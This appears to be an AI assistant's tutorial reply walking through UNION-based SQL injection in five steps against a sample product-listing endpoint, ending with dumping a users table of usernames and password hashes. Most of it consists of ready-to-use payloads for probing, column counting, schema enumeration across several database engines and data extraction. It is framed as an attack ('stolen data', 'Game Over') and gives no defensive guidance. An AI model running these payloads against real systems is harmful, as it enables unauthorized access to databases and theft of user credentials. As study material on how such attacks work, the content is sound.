UNION-based SQLi is called the "Swiss Army knife" of SQL injection because it's the most *versatile* — once it works, you can read *any* table in the entire database with a single query, not just the one the app is querying. Let's build up from the foundations visually.

First, understand what `UNION` does normally in SQL — it stacks two `SELECT` results into one table. The attack hijacks that mechanism.Now here's the full interactive step-by-step walkthrough — from finding the injection point all the way to dumping the `users`.


---

## UNION SQL Injection Attack — Interactive 5-Step Walkthrough

**From injection point to data extraction**

---

## Step 1 — Find a Vulnerable Parameter

A vulnerable parameter is one where user input is placed directly into a SQL query without sanitization. The classic test is a single quote `'` — if it breaks the query and the server throws an error, the parameter is injectable.

### Normal Request (Safe)

```
GET /products?id=1
SQL: SELECT name, price FROM products WHERE id = 1
Result: Widget A | $9.99
```

### Test Injection with a Quote

```
GET /products?id=1'
SQL: SELECT name, price FROM products WHERE id = 1'
Error: You have an error in your SQL syntax near "'"
```

> **⚠️ Vulnerable** — The server returned a SQL error — the quote broke the query. This confirms the parameter is injectable and the DB is MySQL/MariaDB (error format gives engine away).

### Confirm Injection Is Controllable

```
GET /products?id=1 AND 1=1--  → normal result (true)
GET /products?id=1 AND 1=2--  → empty result (false)
```

The `--` comments out everything after your injection.

---

## Step 2 — Count the Columns

UNION requires both SELECT statements to return the exact same number of columns. If the original query returns 3 columns and your UNION returns 2, the DB throws an error. You must find the exact count first.

### Method A — ORDER BY (Cleanest)

```
id=1 ORDER BY 1--   → works (at least 1 col)
id=1 ORDER BY 2--   → works (at least 2 cols)
id=1 ORDER BY 3--   → works (at least 3 cols)
id=1 ORDER BY 4--   → ERROR → only 3 columns!
```

> **💡 Why it works** — ORDER BY N sorts by the Nth column. If N exceeds the column count, the DB throws "Unknown column" — so you binary-search until it breaks. No need to guess column names.

### Method B — NULL Probe (Alternative)

```
id=0 UNION SELECT NULL--          → error (1 col, wrong)
id=0 UNION SELECT NULL,NULL--     → error (2 cols, wrong)
id=0 UNION SELECT NULL,NULL,NULL--  → works! → 3 columns
```

> **⚠️ Why NULL** — NULL is type-compatible with any column type (string, int, date). Using actual values like `1,'a'` risks type mismatch errors — NULL avoids that.

---

## Step 3 — Find Which Columns Are Displayed

The original query might return 3 columns but the app might only display 1 or 2 of them on the page. Your stolen data must go into a column that is actually rendered in the HTML — otherwise you'll never see it.

### Probe Each Column with a Marker String

```
id=0 UNION SELECT 'AAAA',NULL,NULL--
id=0 UNION SELECT NULL,'BBBB',NULL--
id=0 UNION SELECT NULL,NULL,'CCCC'--
```

> **✅ Result** — Only "BBBB" appeared on the page → column 2 is rendered. Use column 2 to exfiltrate data. If you need to steal 2 values but only have 1 visible column, concatenate them: `username||':'||password`

### Concatenation Trick (When Only 1 Column Is Visible)

```sql
UNION SELECT NULL, username || ':' || password, NULL
FROM users--

Result on page: "admin:s3cr3t!"
```

---

## Step 4 — Extract Database Schema

Before stealing data you need to know what tables and columns exist. Every SQL database has a built-in metadata system you can query. This is the "Swiss Army knife" moment — from one injectable parameter you can read the entire DB structure.

### MySQL/MariaDB — List All Tables

```sql
id=0 UNION SELECT NULL,table_name,NULL
FROM information_schema.tables
WHERE table_schema=database()--

Result: products, orders, users, sessions, logs
```

### MySQL — List All Columns in Users Table

```sql
id=0 UNION SELECT NULL,column_name,NULL
FROM information_schema.columns
WHERE table_name='users'--

Result: id, username, password, email, role, created_at
```

### Other Database Engines

| Database | Query |
|----------|-------|
| PostgreSQL | `SELECT table_name FROM information_schema.tables` |
| MSSQL | `SELECT name FROM sys.tables` |
| Oracle | `SELECT table_name FROM all_tables` |
| SQLite | `SELECT name FROM sqlite_master WHERE type='table'` |

---

## Step 5 — Dump the Target Data

Now that you know the table name (users) and column names (username, password), construct the final UNION to pull the data out through the product listing page.

### Final Payload

```
GET /products?id=0 UNION SELECT NULL,username||':'||password,NULL FROM users--
```

> **💡 Why id=0?** — Setting the legitimate id to 0 (or a non-existent value) returns no real product rows — so the only row in the result comes from your UNION. Cleaner output.

### What the Browser Receives

| name (col 1) | price (col 2) ← visible | sku (col 3) |
|--------------|-------------------------|-------------|
| NULL | admin:5f4dcc3b5aa… | NULL |
| NULL | alice:8d969eef6ec… | NULL |
| NULL | bob:25d55ad283a… | NULL |

> **🔴 Game Over** — All usernames and password hashes are now visible in the product price field. From one vulnerable `id` parameter, the entire users table is exfiltrated — without touching a login form, without any authentication.

### Why It Is the Swiss Army Knife

- Unlike error-based or blind SQLi (which extract one bit at a time), UNION returns full rows instantly.
- It works across any table in the DB — users, sessions, admin_keys, credit_cards — with the same payload structure.
- It requires zero brute-forcing once you have the column count and schema — making it the fastest, most complete extraction method.

---

Here's what makes UNION-based injection uniquely powerful compared to all other SQLi types:

| Technique | Speed | What you get | Requires |
|---|---|---|---|
| Error-based | Fast | Schema info from error messages | Verbose errors enabled |
| Boolean blind | Very slow | 1 bit per request | Many hundreds of requests |
| Time-based blind | Slowest | 1 bit per request | Patience + automation |
| UNION-based | Instant | Full rows from ANY table | Visible output column |

UNION wins because the DB does all the work for you — it executes your second query server-side and hands the data back through the same channel the app already uses to display data. You're not guessing or measuring — you're reading.

## The three rules UNION must obey

The DB engine enforces three hard requirements. Violating any one will crash the query with an error:

The number of columns in both `SELECT` statements must be identical. If the original query has 3 columns, your injected query needs exactly 3 columns — that's why Step 2 (counting columns) is mandatory before anything else works.

The data types of each column must be compatible. Column 1 must match column 1's type, column 2 must match column 2's type, and so on. That's why `NULL` is the safest probe — it's compatible with every type (string, integer, date, boolean). If you try `UNION SELECT 1, 'text', 1` but the third column expects a date, the whole query fails.

The second `SELECT` can target any table the DB user has permission to read. That's the power — you don't need to query the same `products` table. You can query `users`, `sessions`, `admin_secrets`, `payment_info` — whatever the DB account can access.

## The comment trick — `--` is critical

Notice every payload ends with `--`. This is a SQL line comment that causes the DB to ignore everything that comes after it in the original query. Without it, the remaining SQL from the application (like a closing `WHERE` clause, `ORDER BY`, or parenthesis) would be appended to your injection and break the syntax. The `--` effectively surgically removes the tail of the original query, giving you clean, valid SQL from your injection onward.
